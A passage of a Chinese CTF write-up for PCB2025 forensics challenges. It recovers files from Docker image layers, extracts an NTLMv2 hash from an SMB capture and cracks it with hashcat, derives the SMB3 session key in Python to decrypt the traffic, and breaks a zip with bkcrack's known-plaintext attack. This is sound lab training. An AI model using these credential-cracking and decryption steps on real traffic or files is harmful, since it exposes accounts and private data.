&lt;missing&gt;                                                                 2 months ago   /bin/sh -c #(nop)  ARG LAUNCHPAD_BUILD_ARCH                                                                                                                    0B
&lt;missing&gt;                                                                 2 months ago   /bin/sh -c #(nop)  ARG RELEASE
</code></pre><p><img alt=alt loading=lazy src=/images/PCB2025/4.png></p><p>可以直接从blobs里去找需要的文件，一个是被删除的syslog.bin，还有一个是decode.py：</p><p><img alt=alt loading=lazy src=/images/PCB2025/5.png></p><p><img alt=alt loading=lazy src=/images/PCB2025/6.png></p><p>decode.py：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-py data-lang=py><span style=display:flex><span><span style=color:#75715e># decode.py</span>
</span></span><span style=display:flex><span>KEY <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x37</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>decode</span>(path):
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>with</span> open(path, <span style=color:#e6db74>&#34;rb&#34;</span>) <span style=color:#66d9ef>as</span> f:
</span></span><span style=display:flex><span>        data <span style=color:#f92672>=</span> f<span style=color:#f92672>.</span>read()
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> bytes(b <span style=color:#f92672>^</span> KEY <span style=color:#66d9ef>for</span> b <span style=color:#f92672>in</span> data)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> __name__ <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;__main__&#34;</span>:
</span></span><span style=display:flex><span>    print(decode(<span style=color:#e6db74>&#34;syslog.bin&#34;</span>))
</span></span></code></pre></div><h2 id=pcb5-smb>pcb5-SMB<a hidden class=anchor aria-hidden=true href=#pcb5-smb>#</a></h2><p>NTLMRawUnHide：</p><pre tabindex=0><code>python NTLMRawUnHide.py -i SMB.pcapng

Found NTLMSSP Message Type 1 : Negotiation

Found NTLMSSP Message Type 2 : Challenge
    &gt; Server Challenge       : 5649f6b5969a9fbf

Found NTLMSSP Message Type 3 : Authentication
    &gt; Domain                 : PC
    &gt; Username               : rockyou
    &gt; Workstation            : PC

NTLMv2 Hash recovered:
rockyou::PC:5649f6b5969a9fbf:f8cb9296a5206484b1baf6bce47abe3b:0101000000000000f68d75c3fb59dc01ba30ab51dc5395c3000000000200160046004c00410047002d005300450052005600450052000100160046004c00410047002d005300450052005600450052000400160046004c00410047002d005300450052005600450052000300160046004c00410047002d0053004500520056004500520007000800f68d75c3fb59dc0106000400020000000800300030000000000000000100000000200000c06bb8a56b86b084ba3cfc2b7e5a0eaef96088346e865b0c93bdd8b4de440ff70a001000000000000000000000000000000000000900200063006900660073002f0046004c00410047002d005300450052005600450052000000000000000000
</code></pre><p>hashcat用rockyou字典爆破得到密码：12megankirwin12</p><p>文件是用SMB3加密传输的，算出session key：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-py data-lang=py><span style=display:flex><span><span style=color:#f92672>from</span> Crypto.Cipher <span style=color:#f92672>import</span> ARC4
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> Crypto.Hash <span style=color:#f92672>import</span> MD4, MD5, HMAC
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>password <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;12megankirwin12&#39;</span>
</span></span><span style=display:flex><span>passwordHash <span style=color:#f92672>=</span> MD4<span style=color:#f92672>.</span>new(password<span style=color:#f92672>.</span>encode(<span style=color:#e6db74>&#39;utf-16-le&#39;</span>))<span style=color:#f92672>.</span>hexdigest()
</span></span><span style=display:flex><span>username <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;rockyou&#39;</span>
</span></span><span style=display:flex><span>domain <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;PC&#39;</span>
</span></span><span style=display:flex><span>ntProofStr <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;f8cb9296a5206484b1baf6bce47abe3b&#39;</span>
</span></span><span style=display:flex><span>serverChallenge <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;5649f6b5969a9fbf&#39;</span>
</span></span><span style=display:flex><span>sessionKey <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;83ef8765dc2621899e86744f9dd9c5c8&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>responseKey <span style=color:#f92672>=</span> HMAC<span style=color:#f92672>.</span>new(bytes<span style=color:#f92672>.</span>fromhex(passwordHash), (username<span style=color:#f92672>.</span>upper()<span style=color:#f92672>+</span>domain<span style=color:#f92672>.</span>upper())<span style=color:#f92672>.</span>encode(<span style=color:#e6db74>&#39;utf-16-le&#39;</span>), MD5)<span style=color:#f92672>.</span>digest()
</span></span><span style=display:flex><span>keyExchangeKey <span style=color:#f92672>=</span> HMAC<span style=color:#f92672>.</span>new(responseKey, bytes<span style=color:#f92672>.</span>fromhex(ntProofStr), MD5)<span style=color:#f92672>.</span>digest()
</span></span><span style=display:flex><span>decryptedSessionKey <span style=color:#f92672>=</span> ARC4<span style=color:#f92672>.</span>new(keyExchangeKey)<span style=color:#f92672>.</span>decrypt(bytes<span style=color:#f92672>.</span>fromhex(sessionKey))
</span></span><span style=display:flex><span>print(<span style=color:#e6db74>&#39;Decrypted SMB Session Key is: </span><span style=color:#e6db74>{}</span><span style=color:#e6db74>&#39;</span><span style=color:#f92672>.</span>format(decryptedSessionKey<span style=color:#f92672>.</span>hex()))
</span></span></code></pre></div><p>运行结果：</p><pre tabindex=0><code>Decrypted SMB Session Key is: a5bfafdad7cb6b35947e06faa4f2504d
</code></pre><p>流量包里找到session id：3100000000100000，和session key一起配置SMB2用于解密：</p><p><img alt=alt loading=lazy src=/images/PCB2025/7.png></p><p>可以导出letter.zip，压缩包里是letter.exe并且解压需要密码，根据exe的文件头来明文攻击，plain.txt：</p><pre tabindex=0><code>This program cannot be run in DOS mode
</code></pre><p>bkcrack：</p><pre tabindex=0><code>bkcrack.exe -C letter.zip -c letter.exe -o 78 -p plain.txt

Found a solution. Stopping.
You may resume the attack with the option: --continue-attack 40468
[21:02:51] Keys
68cc45ab 864060ce ac958caa

bkcrack.exe -C letter.zip -c letter.exe -k 33b19021 93c4a78d 9ceed931 -d letter.exe
</code></pre><p>运行程序输出flag随机的一部分，只要下好断点应该就能在运行过程中从内存里找到完整的flag：</p><p><img alt=alt loading=lazy src=/images/PCB2025/10.png></p><p>debug过程中Alt+B：</p><p><img alt=alt loading=lazy src=/images/PCB2025/9.png></p><p><img alt=alt loading=lazy src=/images/PCB2025/8.png></p></div><footer class=post-footer><ul class=post-tags></ul></footer></article></main><footer class=footer><span>&copy; 2025 <a href=https://blog.w8nn9z.top/>w8nn9z Blog</a></span> ·
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
<a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentColor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script></body></html>